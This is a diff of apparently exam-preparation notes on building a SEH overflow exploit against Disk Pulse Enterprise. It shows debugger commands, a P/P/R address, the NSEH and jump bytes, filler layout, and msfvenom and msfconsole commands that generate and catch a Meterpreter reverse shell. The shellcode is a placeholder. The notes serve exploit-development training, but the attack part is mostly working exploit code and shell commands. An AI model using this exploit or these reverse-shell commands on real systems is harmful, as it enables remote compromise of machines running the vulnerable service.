@@ -150,7 +150,7 @@ send(buf)
 In case the bad characters cause the SEH overflow not happen at all, this command can help to speed up the debug routine:
 
 ```
-PS > Restart-Service "Vuln Service"; .\DbgX.Shell.exe -pn vulnsvc.exe -c 'g; !exchain'; sleep 3; python C:\sehof_bad_chars.py
+PS > Restart-Service "Disk Pulse Enterprise"; .\DbgX.Shell.exe -pn diskpls.exe -c 'g; !exchain'; sleep 3; python C:\sehof_bad_chars.py
 ```
 
 In case the bad characters are truncated from memory, dump the bytes (*EstablisherFrame* - the second argument of the vulnerable *ExecuteHandler*) and examine them manually or use [find-bad-chars.py](https://github.com/epi052/osed-scripts/blob/main/find-bad-chars.py) by [@epi052](https://twitter.com/epi052):
@@ -173,7 +173,7 @@ Or
 
 ## 4. Search for P/P/R Sequence
 
-P/P/R == `pop R32, pop R32, ret`:
+P/P/R is `pop R32, pop R32, ret`:
 
 ```
 $ msf-nasm_shell
@@ -281,7 +281,7 @@ Search with [find-ppr.py](https://github.com/epi052/osed-scripts/blob/main/find-
 Break on the P/P/R and assemble a short jump over the *Next* structure exception handler:
 
 ```
-PS > Restart-Service "Vuln Service"; .\DbgX.Shell.exe -pn vulnsvc.exe -c 'g; bp 0x101576c0; g'; sleep 2; python C:\sehof_ppr.py
+PS > Restart-Service "Disk Pulse Enterprise"; .\DbgX.Shell.exe -pn diskpls.exe -c 'g; bp 0x101576c0; g'; sleep 2; python C:\sehof_ppr.py
 
 Breakpoint 0 hit
 eax=00000000 ebx=00000000 ecx=101576c0 edx=77e06fa0 esi=00000000 edi=00000000
@@ -492,9 +492,12 @@ Evaluate expression: -14084 = ffffc8fc
 
 And then assemble an appropriate jump:
 
-```
-jmp 0xffffc8fc
-0:  e9 f8 c8 ff ff          jmp    ffffc8fd <_main+0xffffc8fd>
+```python
+>>> from keystone import *
+>>> ks = Ks(KS_ARCH_X86, KS_MODE_32)
+>>> jump = [f'\\x{int(opcode):02x}' for opcode in ks.asm("jmp 0xffffc8fc;")[0]]
+>>> print(f"""b'{''.join(jump)}'""")
+("\xe9\xf7\xc8\xff\xff")
 ```
 
 
@@ -510,7 +513,7 @@ size = 6000
 shellcode_size = 600
 
 shellcode  = b'\x90' * 20
-# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.13.37 LPORT=1337 EXITFUNC=thread -b "\x00\x09\x0a\x0d\x20" -e x86/shikata_ga_nai -f python -v shellcode
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=1337 EXITFUNC=thread -b "\x00\x09\x0a\x0d\x20" -e x86/shikata_ga_nai -f python -v shellcode
 # sudo msfconsole -qx 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 1337; set EXITFUNC thread; run'
 shellcode += b"<SHELLCODE>"
 shellcode += b'C' * (shellcode_size - len(shellcode))
@@ -520,7 +523,7 @@ exp += LE(0x101576c0)  # (PPR) pop eax; pop ebx; ret
 exp += b'\x90\x90'                # (NSEH) offset for the 'eb 06' part of the jmp instruction
 #exp += b'\x66\x81\xc4\x52\x0f'    # (Island Hop) add sp, 0xf50
 #exp += b'\xff\xe4'                # (Island Hop) jmp esp
-exp += b'\xe9\xf8\xc8\xff\xff'    # jmp 0xffffc8fc
+exp += b'\xe9\xf7\xc8\xff\xff'    # jmp 0xffffc8fc
 
 filler = b'A' * (2499 - 4)
 nop    = b'\x90' * (size - len(filler + exp + shellcode))
